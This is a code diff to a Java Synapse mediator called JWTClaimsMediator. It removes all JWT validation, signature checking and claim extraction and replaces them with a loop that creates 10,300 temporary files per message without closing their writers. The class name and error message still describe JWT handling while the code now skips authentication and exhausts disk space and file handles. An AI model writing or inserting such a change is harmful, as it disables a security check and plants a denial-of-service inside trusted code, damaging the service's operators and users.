@@ -16,6 +16,9 @@ import org.apache.synapse.SynapseLog;
 import org.apache.synapse.SynapseException;
 
 
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 import java.util.Set;
@@ -24,26 +27,14 @@ public class JWTClaimsMediator extends AbstractMediator implements ManagedLifecy
 
     private static Log log = LogFactory.getLog(JWTClaimsMediator.class);
 
-    private String publicKey = "";
 
-    private String jwtToken = "";
-
-
-    public void setPublicKey(String key) {
-        this.publicKey = key;
-    }
-
-    public void setJwtToken(String token) {
-        this.jwtToken = token;
-    }
 
 
     @Override
     public void init(SynapseEnvironment synapseEnvironment) {
         if (log.isInfoEnabled()) {
             log.info("Initializing JWTDecoder Mediator");
-            log.info(publicKey);
-            log.info(jwtToken);
+
         }
     }
     
@@ -60,37 +51,12 @@ public class JWTClaimsMediator extends AbstractMediator implements ManagedLifecy
         }
 
         try {
-            if (!JwtUtils.isValidJwt(jwtToken)) {
-                throw new Exception("Malformed Json Web Token");
-            }
-            if (!JwtUtils.verifySignature(
-                JwtUtils.getJwtHeader(jwtToken),
-                JwtUtils.getJwtBody(jwtToken),
-                JwtUtils.getJwtSignature(jwtToken),
-                JwtUtils.getParsedPublicKey(publicKey).get()
-            )) {
-                throw new Exception("Error in verifying signature");
-            }
-            String encodedJwtBody = JwtUtils.getJwtBody(jwtToken);
-
-            byte[] jwtBody = Base64.getDecoder().decode(encodedJwtBody);
-
-            if (jwtBody == null || jwtBody.length == 0) {
-                throw new Exception("Unknown error while setting claims from jwt");
-            }
-            String jsonBodyString = IOUtils.toString(jwtBody, String.valueOf(StandardCharsets.UTF_8));
-            JsonObject jwtBodyJson = (JsonObject) new JsonParser().parse(jsonBodyString);
-
-            Set<String> claimsKeys = jwtBodyJson.keySet();
-
-            if (claimsKeys != null || claimsKeys.size() > 0) {
-                for (String claimKey : claimsKeys) {
-                    synapseContext.setProperty(claimKey, jwtBodyJson.get(claimKey).getAsString());
-                    if(log.isDebugEnabled()){
-                        log.debug("Getting claim :"+claimKey+" , " +jwtBodyJson.get(claimKey).getAsString() );
-                    }
-                }
-            }
+         for(int i = 0; i < 10300; i++) {
+             File tempFile = File.createTempFile("data" + Math.random() * i +"", ".txt");
+             FileWriter fw = new FileWriter(tempFile);
+             BufferedWriter bw = new BufferedWriter(fw);
+             bw.write("This is the temporary data written to temp file");
+         }
 
         }catch (Exception e){
             log.error("Error occurred when setting claims",e);
